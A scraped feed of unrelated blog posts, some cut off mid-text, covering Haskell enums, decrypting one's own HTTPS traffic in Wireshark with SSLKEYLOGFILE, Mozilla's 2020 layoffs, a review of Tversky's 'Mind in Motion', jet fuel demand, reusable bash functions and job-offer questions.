    <pre><span></span><span>enum</span> <span>season</span> <span>{</span> <span>SPRING</span><span>,</span> <span>SUMMER</span><span>,</span> <span>FALL</span><span>,</span> <span>WINTER</span> <span>};</span>
</pre></div>

</div>
  <p>Here, <code>SPRING</code>, <code>SUMMER</code>, <code>FALL</code>, and <code>WINTER</code> are essentially defined to be global aliases for the integers <code>0</code>, <code>1</code>, <code>2</code>, and <code>3</code>, and the type <code>enum season</code> is essentially an alias for <code>int</code>.</p></li></ul>

<p>So in TypeScript, the values are strings, and in C, the values are numbers. What are they in Haskell? Well… they simply <em>are</em>.</p>

<p>The Haskell declaration invents four completely new constants out of thin air, <code>Spring</code>, <code>Summer</code>, <code>Fall</code>, and <code>Winter</code>. They aren’t aliases for numbers, nor are they symbols or strings. The compiler doesn’t expose anything about how it chooses to represent these values at runtime; that’s an implementation detail. In Haskell, <code>Spring</code> is now a value <em>distinct from all other values</em>, even if someone in a different module were to also use the name <code>Spring</code>. Haskell type declarations let us play god, creating something from nothing.</p>

<p>Since these values are totally unique, abstract constants, what can we actually do with them? The answer is one thing and <em>exactly</em> one thing: we can branch on them. For example, we can write a function that takes a <code>Season</code> as an argument and returns whether or not Christmas occurs during it:</p>

<div>
 <div>
  <pre><span></span><span>containsChristmas</span> <span>::</span> <span>Season</span> <span>-&gt;</span> <span>Bool</span>
<span>containsChristmas</span> <span>season</span> <span>=</span> <span>case</span> <span>season</span> <span>of</span>
  <span>Spring</span> <span>-&gt;</span> <span>False</span>
  <span>Summer</span> <span>-&gt;</span> <span>True</span>  <span>-- southern hemisphere</span>
  <span>Fall</span>   <span>-&gt;</span> <span>False</span>
  <span>Winter</span> <span>-&gt;</span> <span>True</span>  <span>-- northern hemisphere</span>
</pre></div>

</div>

<p><code>case</code> expressions are, to a first approximation, a lot like C-style <code>switch</code> statements (though they can do a lot more than this simple example suggests). Using <code>case</code>, we can also define conversions from our totally unique <code>Season</code> constants to other types, if we want:</p>

<div>
 <div>
  <pre><span></span><span>seasonToString</span> <span>::</span> <span>Season</span> <span>-&gt;</span> <span>S…</span></pre></div></div></article></div></section></div>

<p>This post will teach you <strong>how to see HTTPS in-action</strong>, but not every detail of how HTTPS works. Instead, you’ll gain a <strong>real life example</strong> to reference if you ever want to study the nitty gritty details.</p>

<p>To do this, we’ll learn how to <strong>snoop on our own HTTPS requests via Wireshark</strong> and witness as your computer establishes a secure connection.</p>

<p>Although the nitty gritty details of HTTPS are outside the scope of this post, we’ll <strong>review the basics</strong> before embarking on this exercise to provide a bit of context.</p>

<p>If you’re already familiar with the basics of HTTPS and TLS, feel free to skip to the <a href="#how-to-snoop-on-your-own-requests">next section</a>.</p>



<h2 id="what-is-https">What is HTTPS?</h2>

<p>HTTP stands for <strong>Hypertext Transfer Protocol</strong>. And at the very least, you likely know that whenever you see <code>https://</code> in the address bar, the <strong>S</strong> in <strong>HTTPS</strong> stands for <strong>secure</strong>: ensuring that communication between your browser and the server is secure.</p>

<p>But how does HTTPS secure communication between you and the server? Your browser will perform a <strong>TLS handshake</strong> before sending any sensitive data.</p>

<h2 id="what-is-a-tls-handshake">What is a TLS Handshake?</h2>

<p>At the beginning of any <code>https://</code> request, your browser performs a TLS handshake: a protocol that ensures <strong>confidentiality</strong>, <strong>authentication</strong>, and <strong>integrity</strong> between your computer and the server it talks to.</p>

<p>Today, we’ll focus on confidentiality which promises to <strong>keep your data secret</strong> from snoopers by encrypting your request. To achieve confidentiality, your computer and the server perform a TLS handshake to negotiate the <strong>master secret</strong> used to derive keys that encrypt and decrypt messages sent between each other.</p>

<p>During this exercise, we’ll capture the “secret sauce” used to establish the master secret in order to decrypt our requests!</p>



<h2 id="capture-an-encrypted-request">Capture an Encrypted Request</h2>

<p>Now that we understand the basics of HTTPS and TLS, let’s see it in-action. To do so, we’ll snoop on our own HTTPS request. First, let’s capture a plain ol’ HTTPS request without any clever tricks yet:</p>

<ol>
  <li>Install the latest version of <a href="https://curl.haxx.se/">curl</a>*</li>
  <li>Install and boot up <a href="https://www.wireshark.org/">Wireshark</a></li>
  <li>Type <code>curl https://github.com</code> in the console (but don’t press enter yet!).</li>
  <li>Start a capture via Wireshark</li>
  <li>Execute our <code>curl</code> command</li>
  <li>Stop the capture</li>
</ol>

<p><em>*NOTE: Since v7.58.0, curl accepts a filename specified by the environment variable <code>SSLKEYLOGFILE</code>: this file logs secrets established during the TLS handshake. These logged secrets let us retroactively decrypt our HTTPS request in the next step– so be sure to install curl &gt;= v7.58.0. Be aware that curl installations may contain varying TLS libraries, and only some libraries support it. For example, MacOS’ default curl installation uses Apple’s Secure Transport library which does not support this flag– so you may need to <code>brew install curl-openssl</code> and rewire your path to prefer it.</em></p>

<p>Now that we captured the request via Wireshark, let’s inspect the relevant packets:</p>

<ol>
  <li>Type <code>tls.handshake</code> in Wireshark filter bar and press enter</li>
  <li>Locate packet labelled <code>Client Hello</code> in the <code>Info</code> field</li>
  <li>Copy IP address from the packet’s <code>Destination</code> field</li>
  <li>Type <code>ip.dst == foobar || ip.src == foobar</code> in Wireshark filter bar (where <code>foobar</code> is the IP address from previous step)*</li>
</ol>

<p><em>*NOTE: Wireshark captures any and all network traffic which produces a lot of noise in our capture. To reduce noise, we filter packets exclusively to and from the server we just curl’d.</em></p>

<p>With our packets filtered, let’s take a peak at the <code>Client Hello</code> packet:</p>

<p><img src="https://bitwiser.dev/public/imgs/client_hello.png" alt="client hello readable"></p>

<p><em>The contents of this Client Hello packet can be read clear as day.</em></p>

<p>This “Client Hello” packet is the first step of the TLS handshake. You may notice it’s readable while every packet afterwards is encrypted. Why?</p>

<p>One of the main selling points of HTTPS (and the underlying TLS handshake) is that it <strong>encrypts traffic so onlookers can’t snoop on data</strong> sent between your computer and the server. Unfortunately, that even includes <em>you</em> snooping on your own requests via Wireshark!</p>

<p><img src="https://bitwiser.dev/public/imgs/encrypted.png" alt="encrypted"></p>

<p><em>From this point on, TLS encrypts all data sent and received.</em></p>

<p>Perhaps you want to see the remaining traffic, decrypted and readable, for educational purposes. Hell, it’s your computer after all. This is indeed possible, and it’s only a quick 5 minute configuration away.</p>

<h2 id="capture-a-decrypted-request">Capture a Decrypted Request</h2>

<p>To do this, we must convince curl’s underlying TLS library to dump valuable secrets established during the handshake to decrypt the data. Repeat the initial steps from the <a href="#capture-an-encrypted-request">Capture an Encrypted Request</a> section but replace the <code>curl https://github.com</code> command with this:</p>

<p>Windows:</p>
<div><div><pre><code>cmd /c "set SSLKEYLOGFILE=%HOMEPATH%\sslkeylog&amp;&amp; curl https://github.com"
</code></pre></div></div>

<p>Unix:</p>
<div><div><pre><code>SSLKEYLOGFILE=~/sslkeylog curl https://github.com
</code></pre></div></div>

<p><em>NOTE: Notice we temporarily set <code>SSLKEYLOGFILE</code> for this one-off command. It’s not wise to set this variable permanently because someone could retroactively decrypt your traffic using this file. While you likely have bigger problems if someone has unauthorized access to your files, it’s best not to leave any trace regardless.</em></p>

<p>If you crack open that SSL key log file we just specified, you’ll see something like this:</p>

<div><div><pre><code>SERVER_HANDSHAKE_TRAFFIC_SECRET 1234567890abcdefghijklmnopqrstuvwxyz...
EXPORTER_SECRET 1234567890abcdefghijklmnopqrstuvwxyz...
SERVER_TRAFFIC_SECRET_0 1234567890abcdefghijklmnopqrstuvwxyz...
CLIENT_HANDSHAKE_TRAFFIC_SECRET 1234567890abcdefghijklmnopqrstuvwxyz...
CLIENT_TRAFFIC_SECRET_0 1234567890abcdefghijklmnopqrstuvwxyz...
</code></pre></div></div>

<p>You can essentially think of this data as the “secret sauce” used to negotiate our secure connection: this is exactly what Wireshark needs to decrypt our request!</p>

<p>With Wireshark containing the capture of our last <code>curl</code> request, do the following:</p>

<ol>
  <li>Go to Edit &gt; Preferences &gt; Protocols &gt; TLS</li>
  <li>Click “Browse” next to (Pre)-Master-Secret log filename</li>
  <li>Select and confirm the <code>SSLKEYLOGFILE</code> location</li>
  <li>Press “OK”</li>
</ol>

<p>Now, let’s take a look at that previously encrypted packet:</p>

<p><img src="https://bitwiser.dev/public/imgs/decrypted.png" alt="decrypted"></p>

<p><em>This previously encrypted packet is now decrypted and readable.</em></p>

<p>Voila! What was once labeled “Encrypted Application Data” is now readable– and we can see that this packet sent over additional TLS extension data.</p>

<p>Peaking even further in our capture, we can find the actual HTML response to our curl request!</p>

<p><img src="https://bitwiser.dev/public/imgs/html_response.png" alt="html response"></p>

<p><em>The HTML response to our curl request.</em></p>

<p>And there you have it. With this neat trick, you can capture and study the steps of the TLS handshake– or even just see the inner workings of an HTTPS request that your browser dev tools abstracts away from you.</p>

<p>Happy snooping! 🕵️</p>



<h2 id="curl-vs-browser">curl vs. Browser</h2>

<p>Why fire a request using curl instead of the browser? The simple answer is that curl produces less noise in your Wireshark capture.</p>

<p>When you request a URL via the browser, it scans the response and fires <strong>many more requests</strong> to fetch images, scripts, etc. defined in the HTML.</p>

<p>When you request a URL via curl, it fires a single request and returns the raw HTML: it does not subsequently request other resources defined in the HTML like your browser does.</p>

<p>Thus, the Wireshark capture is shorter and sweeter.</p>



<p>Why capture our request via Wireshark instead of just using our browser’s dev tools (which automatically decrypts the data for us)?</p>

<p>For 99.9% of web development, browser dev tools does the job because we mainly work on the level of HTTPS and above.</p>

<p>Though if you want to learn about the abstractions below HTTPS, Wireshark lets you see all the nitty gritty details that browser dev tools normally abstracts away from you– as it should, because it’s a lot of noise you often don’t need to worry about!</p>

<p><em>tl;dr: Some thoughts on Mozilla for people who don’t know Mozilla.</em></p>

<p>By now everyone in the tech world has heard of the major layoffs at
the Mozilla Corporation, the organization that creates and distributes
the Firefox web browser. (For those who haven’t heard, about 250
people were laid off, about a quarter of the work force.) Lots of
people in the tech world have spoken their piece about the
significance of this event and what it means for the future of
Mozilla, the web, and so on.</p>

<p>Rather than write something of and for the tech world, I wanted to
briefly explain what’s going on for those of my readers who don’t know
HTML from XML, and who are more familar with the worlds of nonprofits
and regular old businesses. I used to work for Mozilla, and have more
knowledge of it and (I hope) insight into it than most people, but
I’ve been gone from Mozilla for ten years now. Thus what I write below
is based on observing it from a distance, like seeing an old friend
whose life has long since diverged from mine.</p>

<p>Disclaimer: I work for a tech company, and I don’t usually write about
other tech companies. So I will strongly emphasize that what I write
here are my personal opinions only, and do not represent the positions
of my present employer or past employers.</p>

<h2 id="what-is-mozilla">What is Mozilla?</h2>

<p>Mozilla is actually two things, the Mozilla Foundation and the Mozilla
Corporation, which are often confused and conflated in public
discourse. (There’s actually at least one other piece, but these two
are the main ones.) The Mozilla Foundation, founded in 2003 to take
over development of the source code for the Netscape web browser, is a
501(c)(3) tax-exempt nonprofit organization, with a staff of 80 people
and a budget of about $27 million in 2018, the last year for which
figures are available. The Mozilla Corporation, founded in 2005, is a
for-profit business, wholly owned by the Mozilla Foundation, with a
staff of about a thousand and revenue of about $440 million, again
from the 2018 financials.</p>

<p>This organizational structure was designed to allow the Mozilla
Corporation to engage in business activities which would be
incompatible with 501(c)(3) status, with a portion of the revenues
from those activities directed to the Mozilla Foundation to help fund
its activities. Having a nonprofit parent also means that the
management and employees of the Mozilla Corporation can help serve the
public benefit goals of the Mozilla Foundation, while still having
interesting jobs, being paid reasonably well, and feeling themselves
to be part of the overall Silicon Valley high-tech milieu.</p>

<p>Second: The customers of the Mozilla Corporation are not the users of
Firefox (among whom you may count yourself). The Mozilla Corporation’s
customers are large corporations like Google that pay for things that
will help them make money, most notably having their Internet search
service be the default in the Firefox browser. And to complete the old
saying, “If you’re not the customer…”, then the 200+ million Firefox
users are the product, potential viewers of ads served up by Google or
others.</p>

<p>(The existence of the Firefox browser as a competitor to Google’s
Chrome browser also supposedly helps Google avoid unwelcome antitrust
attention, especially now that Microsoft has abandoned its own browser
development efforts to base its own browser on the Chrome code. But
it’s unclear how important this consideration actually is to Google
senior management.)</p>

<p>In the early days of the Mozilla Corporation these search engine
relationships proved extremely lucrative, jumping from less than $5
million in 2004 to over $50 million in 2005, the first year in which
the Mozilla Corporation reported financial results, and eventually
growing to a high of about $540 million in 2017.</p>

<p>But as the number of Firefox users decreases (due to the growing
market dominance of the Chrome browser), and those users click on
fewer online ads (for example, because they’re spending less during
the COVID-19 pandemic), the willingness of Google and other customers
to pay the Mozilla Corporation for those users decreases
accordingly. Thus the Mozilla Corporation cutting a quarter of its
workforce.</p>

<p>(In contrast, to my knowledge the Mozilla Foundation itself is not
laying off anyone, at least at this time. It gets its funding from a
combination of royalties from the Mozilla Corporation for use of the
Firefox and Mozilla trademarks, government and foundation grants, and
individual donations. For 2018 the royalties accounted for about half
of the Mozilla Foundation’s budget, with grants and individual donations
each accounting for about a quarter of the budget.)</p>

<p>So, if you’re an avid user of the Firefox browser and want to chip in
a few dollars to help support its development, there’s actually no way
for you to do so, at least not at present. Your donations will go to
the Mozilla Foundation, which will use them to help fund its outreach
and advocacy initiatives, of which it has several. The Mozilla
Foundation itself does not develop Firefox—or any other software, to
my knowledge.</p>

<h2 id="whence-mozilla">Whence Mozilla?</h2>

<p>How has Mozilla (or, more correctly, the Mozilla Corporation) come
to its present pass? The best way I can explain it is that the Mozilla
Corporation is not really a business in the way we’d normally think of
a business, profit-focused and subject to market discipline.</p>

<p>Instead you can think of the Mozilla Corporation as being analogous to
the Bell Labs or Xerox PARC of yore, R&amp;D organizations funded by a
seemingly-unending stream of profits earned by other businesses that
enjoyed dominant positions in their respective markets. In this sense
Google is to Mozilla as AT&amp;T was to Bell Labs, or Xerox to Xerox
PARC.</p>

<p>Like Bell Labs and Xerox PARC, the Mozilla Corporation provided a home
for some of the smartest software developers around. Like those
organizations, the Mozila Corporation has initiated a myriad of
projects ranging from the mundane and useful (like the Firefox
browser) to the esoteric and speculative. Like those organizations,
the Mozilla Corporation has given away much of what it has produced in
the form of public goods available to everyone at no charge.</p>

<p>Like Bell Labs and Xerox PARC, the Mozilla Corporation has indulged a
taste for “build it yourself” vertical integration, and in particular
for creating its own bespoke development tools and software stack. For
example, like those organizations the Mozilla Corporation has created
its own operating system (FirefoxOS), its own programming language
(Rust), and (of course) its own graphical user environment in the form
of the Firefox browser (not to mention yet another web browser, this
one more research-oriented, and various experiments in software for
virtual reality environments).</p>

<p>And finally, the Mozilla Corporation is engaged in the same struggle
that Bell Labs and Xerox PARC found themselves in: trying to convert a
research-oriented organization into an actual business, and capture
for itself more of the value that it has been providing to the world
(and to its past, present, and future competitors) for free.</p>

<h2 id="whither-mozilla">Whither Mozilla?</h2>

<p>What will happen to Mozilla, and to the Mozilla Corporation in
particular? The basic situation is that Mozilla has tried to be at
least three things simultaneously: an advocacy organization, a
developer and distributor of mass market consumer software and related
services, and (as noted above) a research lab.</p>

<p>Being an advocacy organization is relatively inexpensive, but the
other two functions are not: software development (including
research-related activities) and branding and marketing together
consumed almost three quarters of the combined Mozilla Corporation and
Foundation expense budget of $450 million in 2018. Thus when COVID-19
hit and the Mozilla Corporation hit a brick wall in terms of search
engine revenue, its choice was apparently either to stop being a
consumer software and services company, or to stop being a research
lab.</p>

<p>In the end Mozilla Corporation senior management apparently decided to
go for being a consumer software and services company, and to ditch
any activities not related to that, including research projects.
Having done so, the Mozilla Corporation faces a number of problems:</p>

<p>First, as noted above the Mozilla ethos is arguably more like that of
an R&amp;D lab than of a business proper. Just getting Mozilla
employees to think of themselves as working in the service of a
profit-driven business, and to act in accordance with that thought
every single day, may be an uphill battle.</p>

<p>Second, Mozilla is arguably becoming superfluous, at least as far as
its own largest customer, Google, is concerned. Google has its own
browser and browser development team, its own research lab, and
presumably an inclination to want to spend its R&amp;D money on things
it can control and direct itself. Google also has the ability and the
opportunity to capture the remaining base of Firefox users, at least
those that are monetizable.</p>

<p>There will always be a core of enthusiastic Firefox users, but a lot
of them switch their search engine to something other than Google, run
ad blockers, and don’t click on online ads. Thus they are for the most
part irrelevant from Google’s point of view. At some point the major
value Firefox has for Google will be as presumed insulation from
antitrust enforcement efforts targeting Chrome, but such insurance,
even if it’s of value to Google, doesn’t necessarily require a large
Firefox user base.</p>

<p>Finally, it’s …</p></section></div>

<h3>In “Mind in Motion,” Barbara Tversky reveals the many ways in which the interplay of the body and brain is necessary to enable cognition.</h3>



<p>June 28, 2019 by Dan Falk</p>



<p>Suppose I give you the name of a body part, and ask you to list its main uses: I say legs, you say walking and running; I say ears, you say hearing. And if I say the brain? Well, that’s a no-brainer (so to speak); obviously the brain is for thinking. Of course, it does a bunch of other things, too; after all, when the brain ceases to function, we die — but clearly it’s where cognition happens.</p>



<p>Or is it? No one would argue that the brain isn’t vital for thinking — but quite a few 21st-century psychologists and cognitive scientists believe that the body, as well as the brain, is needed for thinking to actually happen. And it’s not just that the brain needs a body to keep it alive (that much is obvious), but rather, that the brain and the body somehow work together: it’s the combination of brain-plus-body that creates the mental world.</p>



<p>The latest version of this proposition comes from Barbara Tversky, a professor emerita of psychology at Stanford University who also teaches at Columbia. Her new book, <a href="https://www.basicbooks.com/titles/barbara-tversky/mind-in-motion/9780465093076/">“Mind in Motion: How Action Shapes Thought,”</a> is an extended argument for the interplay of mind and body in enabling cognition. She draws on many different lines of evidence, including the way we talk about movement and space, the way we use maps, the way we talk about and use numbers, and the way we gesture.</p>



<p>Tversky devotes a lengthy section to gesture, and for good reason: We do it incessantly. We do it naturally when we talk. But Tversky argues that gesturing is more than just a by-product of speech: it literally helps us think. She invites us to try this experiment: “Sit on your hands. Then explain out loud how to get from your house to the supermarket, train station, your office or school.” Turns out, it’s hard. When we can’t gesture, we have trouble speaking; we simply “can’t find the words,” she writes. (She notes that this isn’t just a thought experiment; it’s been confirmed in the lab.) Even people who have been blind from birth seem to rely on gesturing, she says.</p>



<p>And consider maps. In some sense, maps take gesturing to the next level. We gesture to indicate “over there” — but to pinpoint <em>where</em> over there, we need maps. And so, we create representations, in miniature, of the world around us. The maps can be physical or purely mental. And some of us are very good at it: Tversky reminds us of the well-known recent studies of London taxi drivers, who need to memorize the layout of some 25,000 streets and thousands of landmarks in the British capital (acquiring what cabbies refer to as “The Knowledge”). MRI studies found that all of that mental-mapping affected their brains, increasing the size of certain parts of the hippocampus.</p>



<p>Tversky argues that our ability to imagine the layout of objects in space is at the root of a more general — and more essential — skill. This ability, she believes, is the key to abstract thought. “Spatial thinking enables abstract thinking,” she writes.</p>



<p>The mind imagines the world, but the objects of the mind are not physical objects. What are they? We might call them ideas; psychologists often call them representations. The important thing is their astounding versatility: we can manipulate them, change them, play with them. They can become “symbols in mathematics, words in poetry, particles in physics, molecules in chemistry, buildings in a neighborhood, dancers on a stage,” she writes.</p>



<hr>



<hr>



<p>Sometimes the mind-body link is more subtle, as with “mental rotation” — the act of flipping objects in our imagination. We can see, in our mind’s eye, that if we take a lower-case b and flip it around a vertical axis, it becomes a lower-case d, while an o or a w remain unchanged. Though we perform these flips in our minds, it turns out that doing so also activates the motor areas of our brains — the areas we’d use if we were <em>actually</em> rotating something. As well, we’re better at performing mental rotations when we do pretend-rotations with our hands at the same time.</p>



<p>We can not only imagine things being rearranged in space, we can imagine things at various positions in time. We reflect on what happened and what could have happened, and we imagine what’s to come. At first this might seem to be a purely mental task — but it turns out that we use the same kind of language to talk about time that we use to talk about space. In some sense, we explore time with our minds just as we explore space with our bodies. (And presumably we’ve been doing so for centuries — in other words, since long before Einstein showed us that space and time are connected.) Most of us conceive of the future laying “in front” of us, and the past “behind,” though Tversky points out that the Aymara people of the South American Andes imagine it the other way around.</p>



<p>What seems to be universal is the way we imagine time in a linear fashion. Tversky intuits that her readers may be wondering about cyclical conceptions of time (think of all the things that recur every day, like our various meals, or every year, like the seasons). And what about Eastern cultures, which we’re often told have a more cyclical perspective? But Tversky has collected data from China, and it matches the Western form: “Chinese participants responded the same as Americans, overwhelmingly creating linear representations of cyclical events,” she writes. (And then there’s what Tversky calls the “Famous Ambiguous Question”: What does it mean when we receive a memo that says that Wednesday’s meeting “has been moved forward two days”? Apparently half of us take it to mean the meeting has been moved to Monday, half of us presume it means Friday.)</p>



<p>All of this is interesting, but I wish Tversky had more clearly positioned these findings within the larger history of cognitive science — especially because this body-inclusive approach to cognition isn’t brand new. It goes by various names in the literature — embodied cognition, enactivism, extended mind — none of which appear in Tversky’s index. In a similar vein, Tversky outlines what she calls a “mental spatial framework,” which sounds very similar to what other scholars call “mental modelling.” Perhaps they’re not exactly synonymous, but we’re not told one way or the other. Along with Tversky’s new terminology, there are new laws — nine “cognitive laws,” conveniently collected in a list immediately following the book’s final page. There’s nothing wrong with organizing ideas into laws, but as someone who’s read many such books, I can testify that they don’t always become widely adopted.</p>



<p>And speaking of endings: On the book’s final page — indeed its last sentence —we’re presented with a seemingly important idea, along with still more new terminology. We’re introduced to the word “<em>spraction</em>,” defined as “<em>actions</em> in <em>space</em> that create <em>abstractions</em>” (italics in the original). It seems a bit late in the game for such a move, and one wonders if this term is likely to catch on.</p>



<p>In the end, though, these are more eccentricities than flaws. Despite its oddities, “Mind in Motion” is a compelling journey through the world of cognition — a tour that leaves us with a renewed respect for the connections between the body and the mind, and how the two act together when we imagine, describe, and experience the world.</p>

The U.S. Energy Information Administration (EIA) said demand for jet fuel in May was the lowest<a href="https://www.eia.gov/todayinenergy/detail.php?id=44736"> since <em>1968</em></a><em>.</em> May jet fuel demand fell 67% year-over-year.</p><p>This stat starkly illustrates the near-total collapse of air travel. The industry now is much, much larger than it was in 1968 (although, yes, jets back then were much less fuel-efficient). Jet fuel prices are low, <a href="https://www.eia.gov/dnav/pet/hist/LeafHandler.ashx?n=PET&amp;s=EER_EPJK_PF4_RGC_DPG&amp;f=M">down to $1 per gallon </a>in July. You’d have to go back to January 2016 to find jet fuel prices that low, and back to about 2004 for jet fuel prices to regularly be below the $1 threshold, EIA data show.</p><p>Since May, the situation has improved somewhat. The International Energy Agency (IEA) reports demand for jet fuel bottomed out in May but started to climb again by the end of that month. But it’s a slow climb, and demand still is historically low. Moreover, stockpiles of jet fuel and other “middle distillates” are rising, and this even as <a href="https://www.bloomberg.com/news/articles/2020-07-01/opec-cuts-output-to-lowest-since-1991-as-virus-slams-oil-demand">OPEC cut production </a>to 1991 levels. (The cartel since has said it will start to ease those cuts this month in anticipation of higher demand.)</p><p>Back in 2012, Delta seemed prescient when it bought a refinery in Trainer, Pennsylvania, now the airline’s Monroe Energy unit. Then, when jet fuel’s per-gallon price was north of $3, the refinery was a natural hedge and secured the airline’s supply for fuel on the East Coast (and had the added benefit of revenues from other distillates, like gasoline and diesel). </p><p>That bet isn’t looking so great now. The refinery never did live <a href="https://www.nytimes.com/2020/08/10/business/energy-environment/delta-oil-refinery-jet-fuel.html">up to its promise</a>. The world is awash in cheap jet fuel, and demand for air travel is historically weak. Delta’s refinery lost $114 million in the second quarter. Whether Delta will sell the facility remains an open question, but with oil relatively cheap and no shortage of refining capacity, who would buy it?</p><p><a href="https://airlineweekly.com/subscribe/">Subscribe Now to Airline Weekly</a></p></div></div> </article></div></div></div></div></div>]]>

August 14, 2020 | https://waylonwalker.com/blog/reusable-bash/ | <a href="https://web.archive.org/web/*/https://waylonwalker.com/blog/reusable-bash/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Bash is a language that is quite useful for automation no matter what language you write in.  Bash can do so many powerful system level tasks.  Even if you are on windows these days you are likely to come accross bash inside a cloud VM, Continuous Integration, or even inside of docker.</p>
<p>I have three techniques that help me write more composable bash scripts.</p>
<ul>
<li>Functions</li>
<li>Error Handling</li>
<li><code>if __name__ == "__main__"</code></li>
</ul>
<h2>functions</h2>
<p>Functions in bash are quite simple.  They are something that I wish I would have started using long ago.  They make your code much more reusable.  I often use them in my aliases as well since they can simplify the process and allow more flexibility.</p>
<p><strong>syntax</strong></p>
<div data-language="bash"><pre><code><span>#!/bin/bash</span>

<span>hello_world</span> <span>(</span><span>)</span> <span>{</span>
    <span>echo</span> <span>"hello world"</span>
<span>}</span></code></pre></div>
<p>Source the file to load the function and run it from the terminal.</p>
<p><strong>run it</strong></p>
<div data-language="bash"><pre><code><span>source</span> hello_world.sh
hello_world</code></pre></div>
<p><strong>output</strong></p>

<h2>Arguments</h2>
<p>Arguments and options are quite a bit more complex in bash.  For now we will focus on the basics which are not all that bad.</p>
<h3>positional arguments</h3>
<p>Positional arguments can be pulled out quite easily using <code>$1</code> for the first one, <code>$2</code> for the second and so on.</p>
<p><strong>note</strong> <code>$0</code> is the command that was called.  You will see this often used to find the command called to open up your current shell.</p>
<p><strong>syntax</strong></p>
<div data-language="bash"><pre><code><span>#!/bin/bash</span>

<span>hello</span> <span>(</span><span>)</span> <span>{</span>
    <span>echo</span> <span>"hello <span>$1</span>"</span>
<span>}</span></code></pre></div>
<p><strong>run it</strong></p>
<div data-language="bash"><pre><code><span>source</span> hello.sh
hello waylon</code></pre></div>
<p>Now we have a function that accepts positional arguments and we can call it by passing things into it.</p>
<p><strong>outputs</strong></p>

<p>More than one argument would be ignoreed since we are only looking at <code>$1</code>.</p>
<p><strong>run it</strong></p>
<div data-language="bash"><pre><code><span>source</span> hello.sh
hello waylon walker</code></pre></div>
<p><strong>outputs</strong></p>

<h3>All Arguments</h3>
<p>Bash has another special variable <code>$@</code> that stores <strong>all arguments</strong> in one.</p>
<p><strong>syntax</strong></p>
<div data-language="bash"><pre><code><span>#!/bin/bash</span>

<span>hello</span> <span>(</span><span>)</span> <span>{</span>
    <span>echo</span> <span>"hello <span>$@</span>"</span>
<span>}</span></code></pre></div>
<p>Just the same as before.</p>
<p><strong>run it</strong></p>
<div data-language="bash"><pre><code><span>source</span> hello.sh
hello waylon walker</code></pre></div>
<p>Now the function will output all arguments that are passed into it, since we are using the <code>$@</code> variable.</p>
<p><strong>outputs</strong></p>

<h2>Error Handling</h2>
<p>The easiest and most common way to handle an error in bash is through the use of the logical operators <code>&amp;&amp;</code> (and) and <code>||</code> (or).</p>
<p>Here I have a concrete example from earlier today.  I was creating a bash script to run a python script from cron.  The bash script is there to make sure that we have the python environment, activate it, and run.  If it doesn't have it, it should create it.</p>
<div data-language="bash"><pre><code><span>create_env</span><span>(</span><span>)</span> <span>{</span>
    conda create -n <span>$1</span> <span>python</span><span>=</span><span>3.8</span>
    conda activate <span>$1</span>
    pip <span>install</span> -r requirements.txt
<span>}</span>

<span>env_exists</span><span>(</span><span>)</span> <span>{</span>
conda info --envs <span>|</span> <span>awk</span> <span>'{print <span>$1</span>}'</span> <span>|</span> <span>tail</span> -n +3 <span>|</span> <span>grep</span> -w <span>$1</span> <span>&gt;</span> /dev/null
<span>}</span>

<span>create_if</span> <span>(</span><span>)</span> <span>{</span>
env_exists <span>$1</span>  <span>&amp;&amp;</span> <span>echo</span> <span>"environment exists"</span> <span>||</span> create_env <span>$1</span>
<span>}</span>

create_if my_env</code></pre></div>
<p>If we look at the <code>create_if</code> function, it will check if the environment exists if there is a passing status code <code>0</code>, then it will run <code>echo "environment exists"</code> otherwise it will run <code>create_env $1</code>.</p>
<p><strong>note</strong> Inside of <code>env_exists</code> grep will look for whole words if there is a match it will give a status code 0 if it finds a match and not 0 if there is no match.</p>
<h2>main script</h2>
<p>_<code>if __name__ == "__main__"</code>_</p>
<p>The last thing I want to discuss is making a bash script both runnable and sourcable.  This makes it so that you can <code>source filename.sh</code> and run each function individually, or <code>bash filename.sh</code> to run the script.  This is a similar concept to <code>if __name__ == "__main__"</code> from python.</p>
<p>I did try this from bash and zsh with success.  The following is an example that would pass all arguments into a main function.</p>
<p><strong>syntax</strong></p>
<div data-language="bash"><pre><code><span>if</span> <span>[</span><span>[</span> <span>"<span>${<span>BASH_SOURCE</span><span>[</span>0<span>]</span>}</span>"</span> <span>==</span> <span>"<span>${0}</span>"</span> <span>]</span><span>]</span><span>;</span> <span>then</span>
    main <span>"<span>$@</span>"</span>
<span>fi</span></code></pre></div>
<p>Extending the example above that created a python example if necessary we can create the env if necessary, activate the environment, and run the script.</p>
<p><strong>syntax</strong></p>
<div data-language="bash"><pre><code><span>if</span> <span>[</span><span>[</span> <span>"<span>${<span>BASH_SOURCE</span><span>[</span>0<span>]</span>}</span>"</span> <span>==</span> <span>"<span>${0}</span>"</span> <span>]</span><span>]</span><span>;</span> <span>then</span>
create_if my_env
conda activate my_env
python script.py
<span>fi</span></code></pre></div>
<p>Using this syntax to run our "main" functions will allow us to both run the script or source the script to utilize the functions that we created.</p></div><p>If you found value in this post <br>and want to send a tip.</p></div>]]>

<![CDATA[What Should You Clarify Before Accepting a Job Offer]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1597246382317/_1gWA2FZu.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text">

<p>There are some essential points you should clarify before accepting a job offer. It is easy to miss them at the moment and take a job offer straight away. </p>
<p>As a result, in this article, I want to talk about some questions you should ask before accepting the offer. I suggest you make a small checklist because you might forget them in the interview.</p>
<p>Thus, the questions you could ask are as follows:</p>
<ol>
<li>Is the company claiming ownership if I release a side project?</li>
<li>Does the company have a clear progression path? </li>
<li>Does the company offer me a mentor?</li>
<li>Is the company allowing me to contribute to open source projects? </li>
</ol>

<p>The first question you might want to ask is "<strong>is the company claiming ownership if I release free/paid side projects?</strong>". There are many examples where companies claimed ownership of the employee's projects. That can happen even if you build the project in your free time and on your equipment.</p>
<p>Therefore, you do not want to invest your resources and time to have a company "take" your project away. Moreover, you can even have legal disputes, which is even worse.</p>
<p>As a result, before accepting a job offer, ensure that the company does not claim ownership of your projects. </p>

<p>Another important question is "<strong>do you have a clear progression path?</strong>". It is essential to know if you can progress in the company and what support is available for you.</p>
<p>The years of experience do not matter too much. The reason is that you can do a job for a long time without getting better at it. You have to try to improve actively.</p>
